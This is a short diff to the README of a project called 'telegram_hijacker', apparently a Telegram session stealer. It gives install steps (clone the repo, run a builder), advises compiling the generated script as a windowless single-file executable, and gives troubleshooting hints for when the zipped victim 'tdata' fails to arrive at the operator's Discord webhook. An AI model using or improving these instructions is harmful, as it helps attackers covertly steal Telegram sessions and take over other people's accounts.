@@ -6,7 +6,7 @@
 ## Installation
 
 ### Using git
-Copy repo after launch builder file:
+Copy repo, after launch builder file:
 ```bash
 git clone https://github.com/NeoMetalx1/telegram_hijacker.git
 cd telegram_hijacker
@@ -29,4 +29,4 @@ Then choose (generated_file.py) also I recommend make it --onefile and --windowe
 
 ## Problems
 ### IF YOU GET EMPTY ZIP IT MEANS PATH NOT CORRECT
-### IF YOU DONT GET MESSAGE CHECK YOUR DISCORD_WEBHOOK URL
+### IF YOU DONT GET MESSAGE CHECK YOUR DISCORD_WEBHOOK URL ALSO IT CAN CAUSE OF LARGE TDATA
